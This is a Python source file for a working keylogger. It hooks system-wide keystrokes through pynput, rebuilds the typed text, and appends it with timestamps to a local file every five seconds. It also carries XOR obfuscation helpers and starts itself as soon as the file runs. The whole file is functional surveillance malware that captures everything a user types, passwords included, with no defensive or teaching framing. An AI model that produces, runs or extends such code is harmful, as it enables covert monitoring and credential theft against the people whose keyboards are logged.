import threading
from pynput import keyboard
from datetime import datetime
import json
import os
from flask import jsonify



class IKeylogger:
    def __init__(self):
        self.my_list = []
        self.listener = None

    def on_press(self, key):
        try:
            tempKey = str(key.char)
        except AttributeError:
            if key == keyboard.Key.backspace:
                if self.my_list:
                    self.my_list.pop()
                return
            elif key == keyboard.Key.enter:
                tempKey = '\n'
            elif key == keyboard.Key.space:
                tempKey = ' '
            else:
                tempKey = str(key)
        self.my_list.append(tempKey)

    def start_logging(self):
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()


class AddToFile(IKeylogger):
    def __init__(self):
        super().__init__()
        self.timestamps = []
        threading.Timer(5, self.print_json).start()


    def print_json(self,count=False,filename="data.txt"):
        combined_keys = "".join(self.my_list)# join list, not str(list)

        self.timestamps=(datetime.now().strftime("%d/%m/%Y %H:%M:%S"))
        data = combined_keys + "\n" + self.timestamps
        if not os.path.exists(filename):
            mode = "w"
        else:
            mode = "a"
        if combined_keys:
            with open(filename, mode) as f:
                f.write(data+"\n")
        self.my_list = []
        self.timestamps = []
        if not count:
            threading.Timer(5, self.print_json).start()



    def xor_encrypt(self, text, key):
        return ''.join(f"{ord(c) ^ ord(key[i % len(key)]):02x}"
                       for i, c in enumerate(text))

    def xor_decrypt(self, enc_hex, key):
        return ''.join(chr(int(enc_hex[i:i + 2], 16) ^ ord(key[(i // 2) % len(key)]))
                       for i in range(0, len(enc_hex), 2))


class Manager:
    def __init__(self):
        self.keylogger = AddToFile()

    def run(self):
        self.keylogger.start_logging()
        self.keylogger.print_json(True,"data.txt")



Manager().run()
